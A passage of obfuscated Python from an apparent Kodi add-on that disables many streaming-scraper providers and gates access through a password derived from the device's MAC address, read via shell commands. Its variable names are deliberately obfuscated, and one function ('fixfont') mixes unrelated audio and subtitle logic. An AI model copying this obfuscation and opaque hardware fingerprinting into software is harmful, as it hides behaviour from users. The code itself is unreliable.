		OOO0O0OO0OO0O000O .setSetting ('prf','false')#line:1204
		OOO0O0OO0OO0O000O .setSetting ('put18','false')#line:1205
		OOO0O0OO0OO0O000O .setSetting ('req','false')#line:1206
		OOO0O0OO0OO0O000O .setSetting ('rftv','false')#line:1207
		OOO0O0OO0OO0O000O .setSetting ('rltv','false')#line:1208
		OOO0O0OO0OO0O000O .setSetting ('sc','false')#line:1209
		OOO0O0OO0OO0O000O .setSetting ('seehd','false')#line:1210
		OOO0O0OO0OO0O000O .setSetting ('showbox','false')#line:1211
		OOO0O0OO0OO0O000O .setSetting ('shuid','false')#line:1212
		OOO0O0OO0OO0O000O .setSetting ('sil_gh','false')#line:1213
		OOO0O0OO0OO0O000O .setSetting ('spv','false')#line:1214
		OOO0O0OO0OO0O000O .setSetting ('subs','false')#line:1215
		OOO0O0OO0OO0O000O .setSetting ('tvs','false')#line:1216
		OOO0O0OO0OO0O000O .setSetting ('tw','false')#line:1217
		OOO0O0OO0OO0O000O .setSetting ('upto','false')#line:1218
		OOO0O0OO0OO0O000O .setSetting ('vel','false')#line:1219
		OOO0O0OO0OO0O000O .setSetting ('vex','false')#line:1220
		OOO0O0OO0OO0O000O .setSetting ('vidc','false')#line:1221
		OOO0O0OO0OO0O000O .setSetting ('w4hd','false')#line:1222
		OOO0O0OO0OO0O000O .setSetting ('wav','false')#line:1223
		OOO0O0OO0OO0O000O .setSetting ('wf','false')#line:1224
		OOO0O0OO0OO0O000O .setSetting ('wse','false')#line:1225
		OOO0O0OO0OO0O000O .setSetting ('wss','false')#line:1226
		OOO0O0OO0OO0O000O .setSetting ('wsse','false')#line:1227
		OOO0O0OO0OO0O000O =xbmcaddon .Addon ('plugin.video.speedmax')#line:1228
		OOO0O0OO0OO0O000O .setSetting ('debrid.only','true')#line:1229
		OOO0O0OO0OO0O000O .setSetting ('hosts.captcha','false')#line:1230
		OOO0O0OO0OO0O000O =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1231
		OOO0O0OO0OO0O000O .setSetting ('provider.123moviehd','false')#line:1232
		OOO0O0OO0OO0O000O .setSetting ('provider.300mbdownload','false')#line:1233
		OOO0O0OO0OO0O000O .setSetting ('provider.alltube','false')#line:1234
		OOO0O0OO0OO0O000O .setSetting ('provider.allucde','false')#line:1235
		OOO0O0OO0OO0O000O .setSetting ('provider.animebase','false')#line:1236
		OOO0O0OO0OO0O000O .setSetting ('provider.animeloads','false')#line:1237
		OOO0O0OO0OO0O000O .setSetting ('provider.animetoon','false')#line:1238
		OOO0O0OO0OO0O000O .setSetting ('provider.bnwmovies','false')#line:1239
		OOO0O0OO0OO0O000O .setSetting ('provider.boxfilm','false')#line:1240
		OOO0O0OO0OO0O000O .setSetting ('provider.bs','false')#line:1241
		OOO0O0OO0OO0O000O .setSetting ('provider.cartoonhd','false')#line:1242
		OOO0O0OO0OO0O000O .setSetting ('provider.cdahd','false')#line:1243
		OOO0O0OO0OO0O000O .setSetting ('provider.cdax','false')#line:1244
		OOO0O0OO0OO0O000O .setSetting ('provider.cine','false')#line:1245
		OOO0O0OO0OO0O000O .setSetting ('provider.cinenator','false')#line:1246
		OOO0O0OO0OO0O000O .setSetting ('provider.cmovieshdbz','false')#line:1247
		OOO0O0OO0OO0O000O .setSetting ('provider.coolmoviezone','false')#line:1248
		OOO0O0OO0OO0O000O .setSetting ('provider.ddl','false')#line:1249
		OOO0O0OO0OO0O000O .setSetting ('provider.deepmovie','false')#line:1250
		OOO0O0OO0OO0O000O .setSetting ('provider.ekinomaniak','false')#line:1251
		OOO0O0OO0OO0O000O .setSetting ('provider.ekinotv','false')#line:1252
		OOO0O0OO0OO0O000O .setSetting ('provider.filiser','false')#line:1253
		OOO0O0OO0OO0O000O .setSetting ('provider.filmpalast','false')#line:1254
		OOO0O0OO0OO0O000O .setSetting ('provider.filmwebbooster','false')#line:1255
		OOO0O0OO0OO0O000O .setSetting ('provider.filmxy','false')#line:1256
		OOO0O0OO0OO0O000O .setSetting ('provider.fmovies','false')#line:1257
		OOO0O0OO0OO0O000O .setSetting ('provider.foxx','false')#line:1258
		OOO0O0OO0OO0O000O .setSetting ('provider.freefmovies','false')#line:1259
		OOO0O0OO0OO0O000O .setSetting ('provider.freeputlocker','false')#line:1260
		OOO0O0OO0OO0O000O .setSetting ('provider.furk','false')#line:1261
		OOO0O0OO0OO0O000O .setSetting ('provider.gamatotv','false')#line:1262
		OOO0O0OO0OO0O000O .setSetting ('provider.gogoanime','false')#line:1263
		OOO0O0OO0OO0O000O .setSetting ('provider.gowatchseries','false')#line:1264
		OOO0O0OO0OO0O000O .setSetting ('provider.hackimdb','false')#line:1265
		OOO0O0OO0OO0O000O .setSetting ('provider.hdfilme','false')#line:1266
		OOO0O0OO0OO0O000O .setSetting ('provider.hdmto','false')#line:1267
		OOO0O0OO0OO0O000O .setSetting ('provider.hdpopcorns','false')#line:1268
		OOO0O0OO0OO0O000O .setSetting ('provider.hdstreams','false')#line:1269
		OOO0O0OO0OO0O000O .setSetting ('provider.horrorkino','false')#line:1271
		OOO0O0OO0OO0O000O .setSetting ('provider.iitv','false')#line:1272
		OOO0O0OO0OO0O000O .setSetting ('provider.iload','false')#line:1273
		OOO0O0OO0OO0O000O .setSetting ('provider.iwaatch','false')#line:1274
		OOO0O0OO0OO0O000O .setSetting ('provider.kinodogs','false')#line:1275
		OOO0O0OO0OO0O000O .setSetting ('provider.kinoking','false')#line:1276
		OOO0O0OO0OO0O000O .setSetting ('provider.kinow','false')#line:1277
		OOO0O0OO0OO0O000O .setSetting ('provider.kinox','false')#line:1278
		OOO0O0OO0OO0O000O .setSetting ('provider.lichtspielhaus','false')#line:1279
		OOO0O0OO0OO0O000O .setSetting ('provider.liomenoi','false')#line:1280
		OOO0O0OO0OO0O000O .setSetting ('provider.magnetdl','false')#line:1283
		OOO0O0OO0OO0O000O .setSetting ('provider.megapelistv','false')#line:1284
		OOO0O0OO0OO0O000O .setSetting ('provider.movie2k-ac','false')#line:1285
		OOO0O0OO0OO0O000O .setSetting ('provider.movie2k-ag','false')#line:1286
		OOO0O0OO0OO0O000O .setSetting ('provider.movie2z','false')#line:1287
		OOO0O0OO0OO0O000O .setSetting ('provider.movie4k','false')#line:1288
		OOO0O0OO0OO0O000O .setSetting ('provider.movie4kis','false')#line:1289
		OOO0O0OO0OO0O000O .setSetting ('provider.movieneo','false')#line:1290
		OOO0O0OO0OO0O000O .setSetting ('provider.moviesever','false')#line:1291
		OOO0O0OO0OO0O000O .setSetting ('provider.movietown','false')#line:1292
		OOO0O0OO0OO0O000O .setSetting ('provider.mvrls','false')#line:1294
		OOO0O0OO0OO0O000O .setSetting ('provider.netzkino','false')#line:1295
		OOO0O0OO0OO0O000O .setSetting ('provider.odb','false')#line:1296
		OOO0O0OO0OO0O000O .setSetting ('provider.openkatalog','false')#line:1297
		OOO0O0OO0OO0O000O .setSetting ('provider.ororo','false')#line:1298
		OOO0O0OO0OO0O000O .setSetting ('provider.paczamy','false')#line:1299
		OOO0O0OO0OO0O000O .setSetting ('provider.peliculasdk','false')#line:1300
		OOO0O0OO0OO0O000O .setSetting ('provider.pelisplustv','false')#line:1301
		OOO0O0OO0OO0O000O .setSetting ('provider.pepecine','false')#line:1302
		OOO0O0OO0OO0O000O .setSetting ('provider.primewire','false')#line:1303
		OOO0O0OO0OO0O000O .setSetting ('provider.projectfreetv','false')#line:1304
		OOO0O0OO0OO0O000O .setSetting ('provider.proxer','false')#line:1305
		OOO0O0OO0OO0O000O .setSetting ('provider.pureanime','false')#line:1306
		OOO0O0OO0OO0O000O .setSetting ('provider.putlocker','false')#line:1307
		OOO0O0OO0OO0O000O .setSetting ('provider.putlockerfree','false')#line:1308
		OOO0O0OO0OO0O000O .setSetting ('provider.reddit','false')#line:1309
		OOO0O0OO0OO0O000O .setSetting ('provider.cartoonwire','false')#line:1310
		OOO0O0OO0OO0O000O .setSetting ('provider.seehd','false')#line:1311
		OOO0O0OO0OO0O000O .setSetting ('provider.segos','false')#line:1312
		OOO0O0OO0OO0O000O .setSetting ('provider.serienstream','false')#line:1313
		OOO0O0OO0OO0O000O .setSetting ('provider.series9','false')#line:1314
		OOO0O0OO0OO0O000O .setSetting ('provider.seriesever','false')#line:1315
		OOO0O0OO0OO0O000O .setSetting ('provider.seriesonline','false')#line:1316
		OOO0O0OO0OO0O000O .setSetting ('provider.seriespapaya','false')#line:1317
		OOO0O0OO0OO0O000O .setSetting ('provider.sezonlukdizi','false')#line:1318
		OOO0O0OO0OO0O000O .setSetting ('provider.solarmovie','false')#line:1319
		OOO0O0OO0OO0O000O .setSetting ('provider.solarmoviez','false')#line:1320
		OOO0O0OO0OO0O000O .setSetting ('provider.stream-to','false')#line:1321
		OOO0O0OO0OO0O000O .setSetting ('provider.streamdream','false')#line:1322
		OOO0O0OO0OO0O000O .setSetting ('provider.streamflix','false')#line:1323
		OOO0O0OO0OO0O000O .setSetting ('provider.streamit','false')#line:1324
		OOO0O0OO0OO0O000O .setSetting ('provider.swatchseries','false')#line:1325
		OOO0O0OO0OO0O000O .setSetting ('provider.szukajkatv','false')#line:1326
		OOO0O0OO0OO0O000O .setSetting ('provider.tainiesonline','false')#line:1327
		OOO0O0OO0OO0O000O .setSetting ('provider.tainiomania','false')#line:1328
		OOO0O0OO0OO0O000O .setSetting ('provider.tata','false')#line:1331
		OOO0O0OO0OO0O000O .setSetting ('provider.trt','false')#line:1332
		OOO0O0OO0OO0O000O .setSetting ('provider.tvbox','false')#line:1333
		OOO0O0OO0OO0O000O .setSetting ('provider.ultrahd','false')#line:1334
		OOO0O0OO0OO0O000O .setSetting ('provider.video4k','false')#line:1335
		OOO0O0OO0OO0O000O .setSetting ('provider.vidics','false')#line:1336
		OOO0O0OO0OO0O000O .setSetting ('provider.view4u','false')#line:1337
		OOO0O0OO0OO0O000O .setSetting ('provider.watchseries','false')#line:1338
		OOO0O0OO0OO0O000O .setSetting ('provider.xrysoi','false')#line:1339
		OOO0O0OO0OO0O000O .setSetting ('provider.library','false')#line:1340
def fixfont ():#line:1343
	O00O0000O0O0OO00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1344
	OOO0000O00OOO00O0 =json .loads (O00O0000O0O0OO00O );#line:1346
	OO00000O000O00OOO =OOO0000O00OOO00O0 ["result"]["settings"]#line:1347
	O0OOO0OO00OOOOOOO =[OO0O0O00OOOOO0OO0 for OO0O0O00OOOOO0OO0 in OO00000O000O00OOO if OO0O0O00OOOOO0OO0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1349
	OOO0O0O0OOOO00O0O =O0OOO0OO00OOOOOOO ["options"];#line:1350
	O00O00OO0OOOO000O =O0OOO0OO00OOOOOOO ["value"];#line:1351
	O00O0OOOO0000O0O0 =[OOOO00O0O00O0O00O for (OOOO00O0O00O0O00O ,O0O0O00O0O0OOO000 )in enumerate (OOO0O0O0OOOO00O0O )if O0O0O00O0O0OOO000 ["value"]==O00O00OO0OOOO000O ][0 ];#line:1353
	OOO0O0O00O0O0O0O0 =(O00O0OOOO0000O0O0 +1 )%len (OOO0O0O0OOOO00O0O )#line:1355
	OO000OO00O000O0OO =OOO0O0O0OOOO00O0O [OOO0O0O00O0O0O0O0 ]["value"]#line:1357
	O000OOOO0O00OO000 =OOO0O0O0OOOO00O0O [OOO0O0O00O0O0O0O0 ]["label"]#line:1358
	OO00000O00O00O0OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1360
	try :#line:1362
		O000O0O0OOOO0OOO0 =json .loads (OO00000O00O00O0OO );#line:1363
		if O000O0O0OOOO0OOO0 ["result"]!=True :#line:1365
			raise Exception #line:1366
	except :#line:1367
		sys .stderr .write ("Error switching audio output device")#line:1368
		raise Exception #line:1369
def parseDOM2 (O0O0O000OO0OO0O0O ,name =u"",attrs ={},ret =False ):#line:1370
	if isinstance (O0O0O000OO0OO0O0O ,str ):#line:1373
		try :#line:1374
			O0O0O000OO0OO0O0O =[O0O0O000OO0OO0O0O .decode ("utf-8")]#line:1375
		except :#line:1376
			O0O0O000OO0OO0O0O =[O0O0O000OO0OO0O0O ]#line:1377
	elif isinstance (O0O0O000OO0OO0O0O ,unicode ):#line:1378
		O0O0O000OO0OO0O0O =[O0O0O000OO0OO0O0O ]#line:1379
	elif not isinstance (O0O0O000OO0OO0O0O ,list ):#line:1380
		return u""#line:1381
	if not name .strip ():#line:1383
		return u""#line:1384
	OO0OO0OOOO00O000O =[]#line:1386
	for OO000O0OO0000O0O0 in O0O0O000OO0OO0O0O :#line:1387
		O0O00OOOOO00OOOOO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO000O0OO0000O0O0 )#line:1388
		for O0O00O00O00OO0O00 in O0O00OOOOO00OOOOO :#line:1389
			OO000O0OO0000O0O0 =OO000O0OO0000O0O0 .replace (O0O00O00O00OO0O00 ,O0O00O00O00OO0O00 .replace ("\n"," "))#line:1390
		O000OOOO000O0O0OO =[]#line:1392
		for O0O0OOOOOO0OO0O00 in attrs :#line:1393
			OOO000O0OOOO0O000 =re .compile ('(<'+name +'[^>]*?(?:'+O0O0OOOOOO0OO0O00 +'=[\'"]'+attrs [O0O0OOOOOO0OO0O00 ]+'[\'"].*?>))',re .M |re .S ).findall (OO000O0OO0000O0O0 )#line:1394
			if len (OOO000O0OOOO0O000 )==0 and attrs [O0O0OOOOOO0OO0O00 ].find (" ")==-1 :#line:1395
				OOO000O0OOOO0O000 =re .compile ('(<'+name +'[^>]*?(?:'+O0O0OOOOOO0OO0O00 +'='+attrs [O0O0OOOOOO0OO0O00 ]+'.*?>))',re .M |re .S ).findall (OO000O0OO0000O0O0 )#line:1396
			if len (O000OOOO000O0O0OO )==0 :#line:1398
				O000OOOO000O0O0OO =OOO000O0OOOO0O000 #line:1399
				OOO000O0OOOO0O000 =[]#line:1400
			else :#line:1401
				O0OO000OO00OO0O00 =range (len (O000OOOO000O0O0OO ))#line:1402
				O0OO000OO00OO0O00 .reverse ()#line:1403
				for O0O0O0OOO000OOO00 in O0OO000OO00OO0O00 :#line:1404
					if not O000OOOO000O0O0OO [O0O0O0OOO000OOO00 ]in OOO000O0OOOO0O000 :#line:1405
						del (O000OOOO000O0O0OO [O0O0O0OOO000OOO00 ])#line:1406
		if len (O000OOOO000O0O0OO )==0 and attrs =={}:#line:1408
			O000OOOO000O0O0OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO000O0OO0000O0O0 )#line:1409
			if len (O000OOOO000O0O0OO )==0 :#line:1410
				O000OOOO000O0O0OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO000O0OO0000O0O0 )#line:1411
		if isinstance (ret ,str ):#line:1413
			OOO000O0OOOO0O000 =[]#line:1414
			for O0O00O00O00OO0O00 in O000OOOO000O0O0OO :#line:1415
				OO0OO000OO000000O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0O00O00O00OO0O00 )#line:1416
				if len (OO0OO000OO000000O )==0 :#line:1417
					OO0OO000OO000000O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0O00O00O00OO0O00 )#line:1418
				for O0O00OOO0000OOO0O in OO0OO000OO000000O :#line:1419
					OOO0O0O0OO0000OOO =O0O00OOO0000OOO0O [0 ]#line:1420
					if OOO0O0O0OO0000OOO in "'\"":#line:1421
						if O0O00OOO0000OOO0O .find ('='+OOO0O0O0OO0000OOO ,O0O00OOO0000OOO0O .find (OOO0O0O0OO0000OOO ,1 ))>-1 :#line:1422
							O0O00OOO0000OOO0O =O0O00OOO0000OOO0O [:O0O00OOO0000OOO0O .find ('='+OOO0O0O0OO0000OOO ,O0O00OOO0000OOO0O .find (OOO0O0O0OO0000OOO ,1 ))]#line:1423
						if O0O00OOO0000OOO0O .rfind (OOO0O0O0OO0000OOO ,1 )>-1 :#line:1425
							O0O00OOO0000OOO0O =O0O00OOO0000OOO0O [1 :O0O00OOO0000OOO0O .rfind (OOO0O0O0OO0000OOO )]#line:1426
					else :#line:1427
						if O0O00OOO0000OOO0O .find (" ")>0 :#line:1428
							O0O00OOO0000OOO0O =O0O00OOO0000OOO0O [:O0O00OOO0000OOO0O .find (" ")]#line:1429
						elif O0O00OOO0000OOO0O .find ("/")>0 :#line:1430
							O0O00OOO0000OOO0O =O0O00OOO0000OOO0O [:O0O00OOO0000OOO0O .find ("/")]#line:1431
						elif O0O00OOO0000OOO0O .find (">")>0 :#line:1432
							O0O00OOO0000OOO0O =O0O00OOO0000OOO0O [:O0O00OOO0000OOO0O .find (">")]#line:1433
					OOO000O0OOOO0O000 .append (O0O00OOO0000OOO0O .strip ())#line:1435
			O000OOOO000O0O0OO =OOO000O0OOOO0O000 #line:1436
		else :#line:1437
			OOO000O0OOOO0O000 =[]#line:1438
			for O0O00O00O00OO0O00 in O000OOOO000O0O0OO :#line:1439
				O00OOOO0O0OOO0OOO =u"</"+name #line:1440
				OO0OOOOO0O0000OO0 =OO000O0OO0000O0O0 .find (O0O00O00O00OO0O00 )#line:1442
				OO0O0O00OOO000000 =OO000O0OO0000O0O0 .find (O00OOOO0O0OOO0OOO ,OO0OOOOO0O0000OO0 )#line:1443
				O0OOOO0000000O000 =OO000O0OO0000O0O0 .find ("<"+name ,OO0OOOOO0O0000OO0 +1 )#line:1444
				while O0OOOO0000000O000 <OO0O0O00OOO000000 and O0OOOO0000000O000 !=-1 :#line:1446
					OOOO0OOO0O0OO00O0 =OO000O0OO0000O0O0 .find (O00OOOO0O0OOO0OOO ,OO0O0O00OOO000000 +len (O00OOOO0O0OOO0OOO ))#line:1447
					if OOOO0OOO0O0OO00O0 !=-1 :#line:1448
						OO0O0O00OOO000000 =OOOO0OOO0O0OO00O0 #line:1449
					O0OOOO0000000O000 =OO000O0OO0000O0O0 .find ("<"+name ,O0OOOO0000000O000 +1 )#line:1450
				if OO0OOOOO0O0000OO0 ==-1 and OO0O0O00OOO000000 ==-1 :#line:1452
					OO0000O00O000OO00 =u""#line:1453
				elif OO0OOOOO0O0000OO0 >-1 and OO0O0O00OOO000000 >-1 :#line:1454
					OO0000O00O000OO00 =OO000O0OO0000O0O0 [OO0OOOOO0O0000OO0 +len (O0O00O00O00OO0O00 ):OO0O0O00OOO000000 ]#line:1455
				elif OO0O0O00OOO000000 >-1 :#line:1456
					OO0000O00O000OO00 =OO000O0OO0000O0O0 [:OO0O0O00OOO000000 ]#line:1457
				elif OO0OOOOO0O0000OO0 >-1 :#line:1458
					OO0000O00O000OO00 =OO000O0OO0000O0O0 [OO0OOOOO0O0000OO0 +len (O0O00O00O00OO0O00 ):]#line:1459
				if ret :#line:1461
					O00OOOO0O0OOO0OOO =OO000O0OO0000O0O0 [OO0O0O00OOO000000 :OO000O0OO0000O0O0 .find (">",OO000O0OO0000O0O0 .find (O00OOOO0O0OOO0OOO ))+1 ]#line:1462
					OO0000O00O000OO00 =O0O00O00O00OO0O00 +OO0000O00O000OO00 +O00OOOO0O0OOO0OOO #line:1463
				OO000O0OO0000O0O0 =OO000O0OO0000O0O0 [OO000O0OO0000O0O0 .find (OO0000O00O000OO00 ,OO000O0OO0000O0O0 .find (O0O00O00O00OO0O00 ))+len (OO0000O00O000OO00 ):]#line:1465
				OOO000O0OOOO0O000 .append (OO0000O00O000OO00 )#line:1466
			O000OOOO000O0O0OO =OOO000O0OOOO0O000 #line:1467
		OO0OO0OOOO00O000O +=O000OOOO000O0O0OO #line:1468
	return OO0OO0OOOO00O000O #line:1470
def addItem (OOO0O00O00O000O0O ,O0O0000OOOOO000O0 ,O000O000OOOOO0OO0 ,OOO0O0O0OOO00000O ,O000000OO0000OO0O ,description =None ):#line:1472
	if description ==None :description =''#line:1473
	description ='[COLOR white]'+description +'[/COLOR]'#line:1474
	OOOOOO0OOOO0O0O0O =sys .argv [0 ]+"?url="+urllib .quote_plus (O0O0000OOOOO000O0 )+"&mode="+str (O000O000OOOOO0OO0 )+"&name="+urllib .quote_plus (OOO0O00O00O000O0O )+"&iconimage="+urllib .quote_plus (OOO0O0O0OOO00000O )+"&fanart="+urllib .quote_plus (O000000OO0000OO0O )#line:1475
	OOO00OOO000OOOOOO =True #line:1476
	OOO0OO00O000OOOO0 =xbmcgui .ListItem (OOO0O00O00O000O0O ,iconImage =OOO0O0O0OOO00000O ,thumbnailImage =OOO0O0O0OOO00000O )#line:1477
	OOO0OO00O000OOOO0 .setInfo (type ="Video",infoLabels ={"Title":OOO0O00O00O000O0O ,"Plot":description })#line:1478
	OOO0OO00O000OOOO0 .setProperty ("fanart_Image",O000000OO0000OO0O )#line:1479
	OOO0OO00O000OOOO0 .setProperty ("icon_Image",OOO0O0O0OOO00000O )#line:1480
	OOO00OOO000OOOOOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOOO0OOOO0O0O0O ,listitem =OOO0OO00O000OOOO0 ,isFolder =False )#line:1481
	return OOO00OOO000OOOOOO #line:1482
def get_params ():#line:1484
		O00O00OOOO000O000 =[]#line:1485
		O0O0O00OOOOOO0OO0 =sys .argv [2 ]#line:1486
		if len (O0O0O00OOOOOO0OO0 )>=2 :#line:1487
				O00O00OOOO000OO00 =sys .argv [2 ]#line:1488
				OO000OO0O0OOO000O =O00O00OOOO000OO00 .replace ('?','')#line:1489
				if (O00O00OOOO000OO00 [len (O00O00OOOO000OO00 )-1 ]=='/'):#line:1490
						O00O00OOOO000OO00 =O00O00OOOO000OO00 [0 :len (O00O00OOOO000OO00 )-2 ]#line:1491
				O00000OO000O0O00O =OO000OO0O0OOO000O .split ('&')#line:1492
				O00O00OOOO000O000 ={}#line:1493
				for OO0OO0000O0OO0OO0 in range (len (O00000OO000O0O00O )):#line:1494
						O0O000OO000O0OOO0 ={}#line:1495
						O0O000OO000O0OOO0 =O00000OO000O0O00O [OO0OO0000O0OO0OO0 ].split ('=')#line:1496
						if (len (O0O000OO000O0OOO0 ))==2 :#line:1497
								O00O00OOOO000O000 [O0O000OO000O0OOO0 [0 ]]=O0O000OO000O0OOO0 [1 ]#line:1498
		return O00O00OOOO000O000 #line:1500
def decode (O0O0O00O0O0000OO0 ,OOO0O0O0OO0000OO0 ):#line:1505
    import base64 #line:1506
    O0O0O000O00OO0O00 =[]#line:1507
    if (len (O0O0O00O0O0000OO0 ))!=4 :#line:1509
     return 10 #line:1510
    OOO0O0O0OO0000OO0 =base64 .urlsafe_b64decode (OOO0O0O0OO0000OO0 )#line:1511
    for O0O0OO0O0OOO0O00O in range (len (OOO0O0O0OO0000OO0 )):#line:1513
        O00OOO0OO0OOO0O00 =O0O0O00O0O0000OO0 [O0O0OO0O0OOO0O00O %len (O0O0O00O0O0000OO0 )]#line:1514
        OO0O0O00OOO00O0OO =chr ((256 +ord (OOO0O0O0OO0000OO0 [O0O0OO0O0OOO0O00O ])-ord (O00OOO0OO0OOO0O00 ))%256 )#line:1515
        O0O0O000O00OO0O00 .append (OO0O0O00OOO00O0OO )#line:1516
    return "".join (O0O0O000O00OO0O00 )#line:1517
def tmdb_list (O0O000OOO0OOOO000 ):#line:1518
    O0OO00OOO00O000O0 =decode ("7643",O0O000OOO0OOOO000 )#line:1521
    return int (O0OO00OOO00O000O0 )#line:1524
def u_list (O0OOOOO000O0OO0OO ):#line:1525
    from math import sqrt #line:1527
    OOO0OOOOO000OO0O0 =tmdb_list (TMDB_NEW_API )#line:1528
    OOO00O0O0O00OO000 =str ((getHwAddr ('eth0'))*OOO0OOOOO000OO0O0 )#line:1530
    O0OOOO0OO00000O0O =int (OOO00O0O0O00OO000 [1 ]+OOO00O0O0O00OO000 [2 ]+OOO00O0O0O00OO000 [5 ]+OOO00O0O0O00OO000 [7 ])#line:1531
    OO000OO000OOO0OOO =(ADDON .getSetting ("pass"))#line:1533
    O00O00O00O0OOO000 =(str (round (sqrt ((O0OOOO0OO00000O0O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1538
    if '.'in O00O00O00O0OOO000 :#line:1539
     O00O00O00O0OOO000 =(str (round (sqrt ((O0OOOO0OO00000O0O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1540
    logging .warning (O00O00O00O0OOO000 )#line:1541
    if OO000OO000OOO0OOO ==O00O00O00O0OOO000 :#line:1542
      OOOOO00O0O000O000 =O0OOOOO000O0OO0OO #line:1544
    else :#line:1546
       if STARTP2 ()and STARTP ()=='ok':#line:1547
         return O0OOOOO000O0OO0OO #line:1550
       OOOOO00O0O000O000 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1551
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1552
       sys .exit ()#line:1553
    return OOOOO00O0O000O000 #line:1554
def disply_hwr ():#line:1556
   try :#line:1557
    OO0O00O0OOO0OOOO0 =tmdb_list (TMDB_NEW_API )#line:1558
    OO0O0000O00OO0OOO =str ((getHwAddr ('eth0'))*OO0O00O0OOO0OOOO0 )#line:1559
    O0O00O00OOO0O0OOO =(OO0O0000O00OO0OOO [1 ]+OO0O0000O00OO0OOO [2 ]+OO0O0000O00OO0OOO [5 ]+OO0O0000O00OO0OOO [7 ])#line:1566
    O000OO0OOO00OO000 =(ADDON .getSetting ("action"))#line:1567
    wiz .setS ('action',str (O0O00O00OOO0O0OOO ))#line:1569
   except :pass #line:1570
def disply_hwr2 ():#line:1571
   try :#line:1572
    O00OOO0OO0O000000 =tmdb_list (TMDB_NEW_API )#line:1573
    O0O000OO000O0OO00 =str ((getHwAddr ('eth0'))*O00OOO0OO0O000000 )#line:1575
    O0OOOOOO0OOO0OO00 =(O0O000OO000O0OO00 [1 ]+O0O000OO000O0OO00 [2 ]+O0O000OO000O0OO00 [5 ]+O0O000OO000O0OO00 [7 ])#line:1584
    O0O0000O00O0000OO =(ADDON .getSetting ("action"))#line:1585
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0OOOOOO0OOO0OO00 )#line:1588
   except :pass #line:1589
def getHwAddr (OOO0O0O0000OO00OO ):#line:1591
   import subprocess ,time #line:1592
   OOO0000O000OOOO0O ='windows'#line:1593
   if xbmc .getCondVisibility ('system.platform.android'):#line:1594
       OOO0000O000OOOO0O ='android'#line:1595
   if xbmc .getCondVisibility ('system.platform.android'):#line:1596
     OO00O0OOOOOOOOO00 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1597
     O0000O00OOO0O00O0 =re .compile ('link/ether (.+?) brd').findall (str (OO00O0OOOOOOOOO00 ))#line:1599
     OO000000OOOO0O0O0 =0 #line:1600
     for O000OO00O0O0O0O0O in O0000O00OOO0O00O0 :#line:1601
      if O0000O00OOO0O00O0 !='00:00:00:00:00:00':#line:1602
          O00OOO0OO0OOOOOOO =O000OO00O0O0O0O0O #line:1603
          OO000000OOOO0O0O0 =OO000000OOOO0O0O0 +int (O00OOO0OO0OOOOOOO .replace (':',''),16 )#line:1604
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1606
       O000OOO00OO000OOO =0 #line:1607
       OO000000OOOO0O0O0 =0 #line:1608
       O0O0O0O0000O00000 =[]#line:1609
       O000OOO0O0OO0OO00 =os .popen ("getmac").read ()#line:1610
       O000OOO0O0OO0OO00 =O000OOO0O0OO0OO00 .split ("\n")#line:1611
       for OO000O0OOO000O00O in O000OOO0O0OO0OO00 :#line:1613
            O0OOOOO0OO0O00000 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO000O0OOO000O00O ,re .I )#line:1614
            if O0OOOOO0OO0O00000 :#line:1615
                O0000O00OOO0O00O0 =O0OOOOO0OO0O00000 .group ().replace ('-',':')#line:1616
                O0O0O0O0000O00000 .append (O0000O00OOO0O00O0 )#line:1617
                OO000000OOOO0O0O0 =OO000000OOOO0O0O0 +int (O0000O00OOO0O00O0 .replace (':',''),16 )#line:1620
   else :#line:1622
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1623
   try :#line:1640
    return OO000000OOOO0O0O0 #line:1641
   except :pass #line:1642
def getpass ():#line:1643
	disply_hwr2 ()#line:1645
def setpass ():#line:1646
    OOOOOO00O00OO0000 =xbmcgui .Dialog ()#line:1647
    OOO0000OO0OOOO00O =''#line:1648
    O0O0OOOOOO0OOO0OO =xbmc .Keyboard (OOO0000OO0OOOO00O ,'הכנס סיסמה')#line:1650
    O0O0OOOOOO0OOO0OO .doModal ()#line:1651
    if O0O0OOOOOO0OOO0OO .isConfirmed ():#line:1652
           O0O0OOOOOO0OOO0OO =O0O0OOOOOO0OOO0OO .getText ()#line:1653
    wiz .setS ('pass',str (O0O0OOOOOO0OOO0OO ))#line:1654
def setuname ():#line:1655
    O00O0OO0O0OO00OOO =''#line:1656
    OO00OO0OOO000OOO0 =xbmc .Keyboard (O00O0OO0O0OO00OOO ,'הכנס שם משתמש')#line:1657
    OO00OO0OOO000OOO0 .doModal ()#line:1658
    if OO00OO0OOO000OOO0 .isConfirmed ():#line:1659
           O00O0OO0O0OO00OOO =OO00OO0OOO000OOO0 .getText ()#line:1660
           wiz .setS ('user',str (O00O0OO0O0OO00OOO ))#line:1661
def powerkodi ():#line:1662
    os ._exit (1 )#line:1663
def buffer1 ():#line:1665
	O00O0O0O000O0O000 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1666
